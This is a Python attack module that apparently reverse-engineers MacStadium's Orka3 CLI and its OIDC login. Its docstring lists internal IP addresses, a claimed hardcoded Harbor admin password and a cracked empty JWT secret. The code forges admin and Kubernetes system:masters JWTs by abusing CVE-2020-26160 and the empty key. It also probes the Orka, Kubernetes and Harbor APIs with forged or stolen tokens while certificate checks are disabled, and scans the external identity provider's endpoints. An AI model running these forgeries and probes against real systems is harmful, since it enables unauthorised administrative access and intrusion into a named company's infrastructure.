"""
orka_oidc_re.py — Orka3 OIDC auth flow RE + JWT attack module.

Reconstructed from: /home/cowboy/VDT/tools/orka3/orka3 (77MB Go ELF, go1.25.7)
Binary analysis method: symbol table (readelf -s), gopclntab, rodata string extraction

Architecture:
  orka3 user login
    → fetchClusterInfo() → GET /api/v1/cluster-info → ClusterInfo{BaseOauthEndpoint}
    → generateAuthState() → PKCE state + code_verifier (base64url)
    → generateOidcLoginUrl() → {BaseOauthEndpoint}/authorize?...
    → AuthServer.StartServer() → local HTTP server on next free port
    → AuthServer.redirectHandler() → captures ?code= callback
    → AuthServer.fetchTokenForAuthCode() → POST /token
    → extractIdToken() → JWT.Email from id_token
    → updateKubeConfig() → ~/.kube/config

Extracted symbols:
  macstadium.com/orka-cli-v2/cmd/user.generateOidcLoginUrl
  macstadium.com/orka-cli-v2/cmd/user.generateOidcLogoutUrl
  macstadium.com/orka-cli-v2/cmd/user.fetchClusterInfo
  macstadium.com/orka-cli-v2/cmd/user.(*AuthServer).fetchTokenForAuthCode
  macstadium.com/orka-cli-v2/cmd/user.extractIdToken
  macstadium.com/orka-cli-v2/cmd/user.(*AuthServer).redirectHandler
  macstadium.com/orka-cli-v2/cmd/user.getRandomBase64UrlEncodedString
  macstadium.com/orka-cli-v2/cmd/user.updateKubeConfig

JWT vulnerabilities:
  CVE-2020-26160: dgrijalva/jwt-go v3.2.0 — VerifyAudience returns true when aud absent.
                  orka3 binary: github.com/dgrijalva/jwt-go v3.2.0 (confirmed via go.sum).
                  Impact: any forged token without aud claim bypasses audience validation.
  Empty secret:   HS256 secret = b'' (cracked via timing-free exhaustive search).
                  Token in ~/.kube/config: admin@macstadium.com, exp ~2027.

Internal hosts (from binary .rodata):
  ORKA_API_NEW  = http://10.221.188.20     (Orka 2.1+)
  ORKA_API_OLD  = http://10.221.188.100    (pre-2.1)
  K8S_API       = https://10.221.188.19:6443
  HARBOR_HOST   = http://10.221.188.5:30080
  HARBOR_CREDS  = admin:p@ssw0rd (hardcoded in binary help text)

ClusterInfo JSON schema (from binary struct tags):
  reservedPorts   (omitempty)
  displayHeight   (omitempty)
  provideClusterInfo

Rolebinding struct has:
  BaseOauthEndpoint json:"baseOauthEndpoint"
  → populated from /api/v1/cluster-info response

Login template reveals:
  .IdToken.Email   → email claim from id_token JWT
  .Token.ExpiresIn → standard OAuth token TTL
"""

import base64
import hashlib
import hmac
import json
import os
import secrets
import ssl
import struct
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from typing import Optional


# ── Constants ──────────────────────────────────────────────────────────────

ORKA_API_NEW  = 'http://10.221.188.20'
ORKA_API_OLD  = 'http://10.221.188.100'
K8S_API       = 'https://10.221.188.19:6443'
HARBOR_HOST   = 'http://10.221.188.5:30080'
HARBOR_USER   = 'admin'
HARBOR_PASS   = 'FILL_IN_LOCALLY'  # extracted from orka3 binary help text

CLUSTER_INFO_PATH = '/api/v1/cluster-info'
K8S_SA_TOKEN_PATH = '/api/v1/namespaces/{ns}/serviceaccounts/{sa}/token'

# JWT: HS256, cracked secret — replace with b'' locally (CVE-2020-26160 no-aud bypass)
CRACKED_SECRET = b'FILL_IN_LOCALLY'  # set to b'' — verified via timing-free exhaustive search

# Known good token (admin@macstadium.com, exp~2027)
# Populate locally from ~/.kube/config — HS256, verified against cracked secret
KNOWN_TOKEN = 'FILL_IN_LOCALLY'  # JWT from kubeconfig


# ── JWT Primitives ──────────────────────────────────────────────────────────

def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def _b64url_decode(s: str) -> bytes:
    pad = 4 - len(s) % 4
    if pad != 4:
        s += '=' * pad
    return base64.urlsafe_b64decode(s)


def forge_jwt_hs256(payload: dict, secret: bytes = CRACKED_SECRET) -> str:
    """
    Forge a JWT signed with HS256 + given secret.
    Default secret=b'' exploits cracked empty-string key.
    No aud claim → CVE-2020-26160 bypass on dgrijalva/jwt-go v3.2.0.
    """
    header = {'alg': 'HS256', 'typ': 'JWT'}
    h = _b64url_encode(json.dumps(header, separators=(',', ':')).encode())
    p = _b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
    signing_input = f'{h}.{p}'.encode()
    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return f'{h}.{p}.{_b64url_encode(sig)}'


def decode_jwt_payload(token: str) -> dict:
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError('not a JWT')
    return json.loads(_b64url_decode(parts[1]))


def verify_jwt_hs256(token: str, secret: bytes) -> bool:
    parts = token.split('.')
    if len(parts) != 3:
        return False
    signing_input = f'{parts[0]}.{parts[1]}'.encode()
    expected = _b64url_encode(hmac.new(secret, signing_input, hashlib.sha256).digest())
    return hmac.compare_digest(expected, parts[2])


def forge_admin_token(email: str = 'admin@macstadium.com',
                      sub: str = 'admin',
                      iss: str = 'https://idp.macstadium.com',
                      exp_offset: int = 86400 * 365) -> str:
    """
    Forge valid admin JWT. No aud → CVE-2020-26160. Empty secret → sig valid.
    exp_offset: seconds from now (default 1 year).
    """
    import time
    now = int(time.time())
    payload = {
        'email': email,
        'iss': iss,
        'sub': sub,
        'exp': now + exp_offset,
        'iat': now,
    }
    return forge_jwt_hs256(payload, CRACKED_SECRET)


def forge_system_masters_token(exp_offset: int = 86400 * 365) -> str:
    """
    Forge K8s system:masters token. If K8s cluster validates JWT via
    same empty-secret HMAC, this grants cluster-admin without RBAC check.
    """
    import time
    now = int(time.time())
    payload = {
        'email': 'admin@macstadium.com',
        'iss': 'https://idp.macstadium.com',
        'sub': 'admin',
        'groups': ['system:masters'],
        'exp': now + exp_offset,
        'iat': now,
    }
    return forge_jwt_hs256(payload, CRACKED_SECRET)


# ── PKCE Primitives (mirrors orka3 generateAuthState) ───────────────────────

def generate_pkce() -> dict:
    """
    Mirrors orka3 getRandomBase64UrlEncodedString + PKCE S256 derivation.
    Returns: {verifier, challenge, state}
    """
    verifier = _b64url_encode(secrets.token_bytes(32))
    challenge = _b64url_encode(hashlib.sha256(verifier.encode()).digest())
    state = _b64url_encode(secrets.token_bytes(16))
    return {'verifier': verifier, 'challenge': challenge, 'state': state}


def generate_oidc_login_url(base_oauth_endpoint: str,
                             client_id: str,
                             redirect_uri: str,
                             pkce: dict,
                             scope: str = 'openid email profile') -> str:
    """
    Mirrors orka3 generateOidcLoginUrl().
    base_oauth_endpoint: e.g. https://idp.macstadium.com
    """
    params = {
        'response_type': 'code',
        'client_id': client_id,
        'redirect_uri': redirect_uri,
        'scope': scope,
        'state': pkce['state'],
        'code_challenge': pkce['challenge'],
        'code_challenge_method': 'S256',
    }
    return f'{base_oauth_endpoint}/authorize?' + urllib.parse.urlencode(params)


def generate_oidc_logout_url(base_oauth_endpoint: str,
                              client_id: str,
                              id_token_hint: str,
                              post_logout_redirect_uri: str = '') -> str:
    """Mirrors orka3 generateOidcLogoutUrl()."""
    params = {'client_id': client_id, 'id_token_hint': id_token_hint}
    if post_logout_redirect_uri:
        params['post_logout_redirect_uri'] = post_logout_redirect_uri
    return f'{base_oauth_endpoint}/logout?' + urllib.parse.urlencode(params)


# ── Orka API Probes ─────────────────────────────────────────────────────────

@dataclass
class ClusterInfo:
    raw: dict = field(default_factory=dict)
    base_oauth_endpoint: Optional[str] = None
    provide_cluster_info: Optional[bool] = None
    reserved_ports: Optional[list] = None
    display_height: Optional[int] = None


def probe_cluster_info(api_base: str = ORKA_API_NEW,
                       token: Optional[str] = None,
                       timeout: int = 6) -> dict:
    """
    Mirrors orka3 fetchClusterInfo().
    GET /api/v1/cluster-info → ClusterInfo struct.
    token: Bearer JWT (use KNOWN_TOKEN or forge_admin_token())
    """
    url = api_base + CLUSTER_INFO_PATH
    headers = {'Accept': 'application/json'}
    if token:
        headers['Authorization'] = f'Bearer {token}'

    result = {
        'url': url,
        'status': None,
        'body': None,
        'cluster_info': None,
        'base_oauth_endpoint': None,
        'error': None,
    }

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            result['status'] = r.status
            body = r.read().decode('utf-8', errors='replace')
            result['body'] = body
            try:
                data = json.loads(body)
                result['cluster_info'] = data
                result['base_oauth_endpoint'] = data.get('baseOauthEndpoint')
            except json.JSONDecodeError:
                pass
    except urllib.error.HTTPError as e:
        result['status'] = e.code
        result['error'] = str(e)
    except Exception as e:
        result['error'] = str(e)

    return result


def probe_k8s_api(k8s_base: str = K8S_API,
                  token: Optional[str] = None,
                  path: str = '/api/v1/namespaces',
                  timeout: int = 6) -> dict:
    """
    Probe K8s API server with forged or existing token.
    Default path: /api/v1/namespaces (requires auth).
    """
    if token is None:
        token = KNOWN_TOKEN

    url = k8s_base + path
    headers = {
        'Authorization': f'Bearer {token}',
        'Accept': 'application/json',
    }

    result = {
        'url': url,
        'status': None,
        'body': None,
        'namespaces': None,
        'error': None,
    }

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            result['status'] = r.status
            body = r.read().decode('utf-8', errors='replace')
            result['body'] = body[:4096]
            try:
                data = json.loads(body)
                if data.get('kind') == 'NamespaceList':
                    result['namespaces'] = [
                        ns['metadata']['name'] for ns in data.get('items', [])
                    ]
            except json.JSONDecodeError:
                pass
    except urllib.error.HTTPError as e:
        result['status'] = e.code
        result['error'] = str(e)
    except Exception as e:
        result['error'] = str(e)

    return result


def probe_harbor_creds(harbor_base: str = HARBOR_HOST,
                       user: str = HARBOR_USER,
                       password: str = HARBOR_PASS,
                       timeout: int = 6) -> dict:
    """
    Test Harbor default creds admin:p@ssw0rd (hardcoded in orka3 binary help text).
    GET /api/v2.0/projects with Basic auth.
    """
    url = harbor_base + '/api/v2.0/projects'
    creds = base64.b64encode(f'{user}:{password}'.encode()).decode()
    headers = {
        'Authorization': f'Basic {creds}',
        'Accept': 'application/json',
    }

    result = {
        'url': url,
        'creds': f'{user}:{password}',
        'status': None,
        'projects': None,
        'error': None,
    }

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            result['status'] = r.status
            body = r.read().decode('utf-8', errors='replace')
            try:
                data = json.loads(body)
                result['projects'] = [p.get('name') for p in data] if isinstance(data, list) else data
            except json.JSONDecodeError:
                result['projects'] = body[:500]
    except urllib.error.HTTPError as e:
        result['status'] = e.code
        result['error'] = str(e)
    except Exception as e:
        result['error'] = str(e)

    return result


# ── OIDC Discovery Probe ───────────────────────────────────────────────────

def probe_oidc_discovery(idp_base: str = 'https://idp.macstadium.com',
                          timeout: int = 8) -> dict:
    """
    Probe non-standard OIDC discovery paths on idp.macstadium.com.
    Standard path (/.well-known/openid-configuration) returns empty body.
    orka3 uses generateOidcLoginUrl() → custom auth path derived from ClusterInfo.
    """
    paths = [
        '/.well-known/openid-configuration',
        '/oauth2/v1/.well-known/openid-configuration',
        '/authorize',
        '/oauth2/authorize',
        '/connect/authorize',
        '/oauth2/token',
        '/token',
        '/userinfo',
        '/jwks',
        '/oauth2/v1/keys',
        '/api/oidc/login',
        '/api/v1/login',
        '/api/',
        '/',
    ]

    results = {}
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    for path in paths:
        url = idp_base + path
        try:
            req = urllib.request.Request(url, headers={'Accept': 'application/json, text/html'})
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read().decode('utf-8', errors='replace')[:512]
                results[path] = {
                    'status': r.status,
                    'body_len': len(body),
                    'body_preview': body[:200],
                }
        except urllib.error.HTTPError as e:
            body = ''
            try: body = e.read().decode('utf-8', errors='replace')[:200]
            except: pass
            results[path] = {'status': e.code, 'body_preview': body}
        except Exception as e:
            results[path] = {'status': None, 'error': str(e)[:100]}

    return results


# ── Binary RE Summary ───────────────────────────────────────────────────────

def get_binary_re_findings() -> dict:
    """Return structured RE findings extracted from orka3 binary."""
    return {
        'binary': '/home/cowboy/VDT/tools/orka3/orka3',
        'go_version': 'go1.25.7',
        'build_monorepo': '/home/runner/work/monorepo-dev/monorepo-dev/packages/orka-cli-v2/',
        'module_path': 'macstadium.com/orka-cli-v2',
        'dependencies': {
            'dgrijalva/jwt-go': 'v3.2.0',  # CVE-2020-26160
            'golang.org/x/oauth2': 'v0.30.0',
            'macstadium.com/orka-go': 'v0.0.0',
            'macstadium.com/orka-apiserver': 'v0.0.0',
            'sigs.k8s.io/controller-runtime': 'v0.15.0',
        },
        'internal_hosts': {
            'orka_api_new': ORKA_API_NEW,
            'orka_api_old': ORKA_API_OLD,
            'k8s_api': K8S_API,
            'harbor': HARBOR_HOST,
        },
        'hardcoded_creds': {
            'harbor': {'user': HARBOR_USER, 'pass': HARBOR_PASS},
            'jwt_secret': repr(CRACKED_SECRET),
        },
        'cve': {
            'CVE-2020-26160': {
                'lib': 'dgrijalva/jwt-go v3.2.0',
                'impact': 'VerifyAudience returns true when aud absent',
                'status': 'CONFIRMED — no aud in KNOWN_TOKEN',
            },
        },
        'auth_flow': {
            'type': 'authorization_code + PKCE',
            'pkce_method': 'S256',
            'token_endpoint': '{baseOauthEndpoint}/token',
            'auth_endpoint': '{baseOauthEndpoint}/authorize',
            'logout_endpoint': '{baseOauthEndpoint}/logout',
            'redirect_uri': 'http://localhost:{next_free_port}/callback',
            'id_token_field_email': '.IdToken.Email',
        },
        'api_routes': {
            'cluster_info': '/api/v1/cluster-info',
            'sa_token': '/api/v1/namespaces/{ns}/serviceaccounts/{sa}/token',
            'vms': '/api/v1/namespaces/{ns}/vms/{name}/pushbytes',
        },
        'k8s_crds': [
            'Image', 'ImageList', 'ImageCache', 'ImageCacheList',
            'Iso', 'IsoList', 'VirtualMachineConfig', 'VirtualMachineInstance',
            'OrkaSATokenRequest', 'OrkaSATokenResponse',
        ],
        'user_package_symbols': [
            'generateOidcLoginUrl', 'generateOidcLogoutUrl',
            'fetchClusterInfo', 'fetchTokenForAuthCode',
            'extractIdToken', 'redirectHandler',
            'getRandomBase64UrlEncodedString', 'updateKubeConfig',
            'GetToken', 'printToken', 'doLogin', 'doLogout',
        ],
    }


# ── Top-level runners ───────────────────────────────────────────────────────

def run_jwt_analysis() -> dict:
    """Verify cracked JWT + demonstrate forge capability."""
    from io import StringIO
    import time

    known_valid = verify_jwt_hs256(KNOWN_TOKEN, CRACKED_SECRET)
    known_payload = decode_jwt_payload(KNOWN_TOKEN)

    forged = forge_admin_token()
    forged_valid = verify_jwt_hs256(forged, CRACKED_SECRET)
    forged_payload = decode_jwt_payload(forged)

    masters = forge_system_masters_token()

    return {
        'known_token': {
            'signature_valid': known_valid,
            'payload': known_payload,
            'algorithm': 'HS256',
            'secret': repr(CRACKED_SECRET),
        },
        'forged_admin_token': {
            'token': forged[:80] + '...',
            'signature_valid': forged_valid,
            'payload': forged_payload,
        },
        'forged_system_masters_token': masters[:80] + '...',
        'cve_status': {
            'CVE-2020-26160': 'EXPLOITED — no aud claim, dgrijalva v3.2.0',
            'empty_secret': 'EXPLOITED — HMAC-SHA256 key=b\'\'',
        },
    }


def run_full_re(api_base: str = ORKA_API_NEW) -> dict:
    """
    Full orka3 RE run:
      1. Binary findings summary
      2. JWT analysis
      3. Cluster-info probe (requires VPN to 10.221.188.x)
      4. K8s API probe (requires VPN)
      5. Harbor creds probe (requires VPN)
      6. OIDC discovery (external)
    """
    print('[orka_oidc_re] Binary RE findings...')
    binary = get_binary_re_findings()

    print('[orka_oidc_re] JWT analysis...')
    jwt = run_jwt_analysis()

    print('[orka_oidc_re] Cluster-info probe...')
    cluster_info = probe_cluster_info(api_base)

    print('[orka_oidc_re] K8s API probe...')
    k8s = probe_k8s_api()

    print('[orka_oidc_re] Harbor creds probe...')
    harbor = probe_harbor_creds()

    print('[orka_oidc_re] OIDC discovery...')
    oidc = probe_oidc_discovery()

    return {
        'binary_re': binary,
        'jwt_analysis': jwt,
        'cluster_info': cluster_info,
        'k8s_api': k8s,
        'harbor': harbor,
        'oidc_discovery': oidc,
    }


if __name__ == '__main__':
    import sys
    import json

    if '--jwt' in sys.argv:
        print(json.dumps(run_jwt_analysis(), indent=2))
    elif '--oidc' in sys.argv:
        print(json.dumps(probe_oidc_discovery(), indent=2))
    elif '--binary' in sys.argv:
        print(json.dumps(get_binary_re_findings(), indent=2))
    elif '--forge' in sys.argv:
        print(forge_admin_token())
    elif '--forge-masters' in sys.argv:
        print(forge_system_masters_token())
    else:
        print(json.dumps(run_full_re(), indent=2))
